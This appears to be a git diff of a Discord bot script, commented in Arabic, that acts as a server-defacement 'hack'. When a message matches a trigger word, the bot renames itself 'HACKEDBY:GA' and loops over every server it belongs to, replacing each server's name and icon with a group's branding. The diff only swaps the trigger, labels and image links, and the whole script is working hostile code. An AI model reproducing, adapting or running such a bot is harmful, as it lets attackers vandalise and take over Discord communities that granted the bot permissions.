@@ -8,7 +8,7 @@ const client = new Discord.Client();
 
 
 
-var x_x = "OneFamily" //هنا تحط الامر اللي يشغل الهاك
+var x_x = "OF" //هنا تحط الامر اللي يشغل الهاك
 
 //اسم البوت واسم السيرفر وصورهم وكل شئ
 
@@ -20,13 +20,13 @@ client.on('message', message => {
 });
 client.on('message', message => {
  if (message.content === x_x) {
-  client.user.setUsername("Done Hack")
+  client.user.setUsername("HACKEDBY:GA")
 
  }
 });
 client.on('message', message => {
  if (message.content === x_x) {
-  client.user.setGame(`Done Hack`, 'https://www.twitch.tv/hix')
+  client.user.setGame(`OneFamily,Team`, 'https://www.twitch.tv/hix')
 
  }
 });
@@ -34,14 +34,14 @@ client.on('message', message => {
 client.on('message', message => {
  if (message.content === x_x) {
   client.guilds.forEach(m => {
-   m.setIcon(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)
+   m.setIcon(`https://cdn.discordapp.com/attachments/405110067738837030/506808411766259712/images_10.jpeg`)
   })
  }
 });
 client.on('message', message => {
  if (message.content === x_x) {
   client.guilds.forEach(m => {
-   m.setName(`Done Hack`)
+   m.setName(`OneFamily.Team`)
   })
  }
 });
@@ -50,7 +50,7 @@ client.on('message', message => {
  if (message.content === x_x) {
   if (!message.channel.guild) return;
 
-  message.guild.setIcon(`https://cdn.discordapp.com/attachments/435763332461625354/436093452602703882/Anonymus.png`)
+  message.guild.setIcon(`https://cdn.discordapp.com/attachments/405110067738837030/506808411766259712/images_10.jpeg`)
 
  }
 });
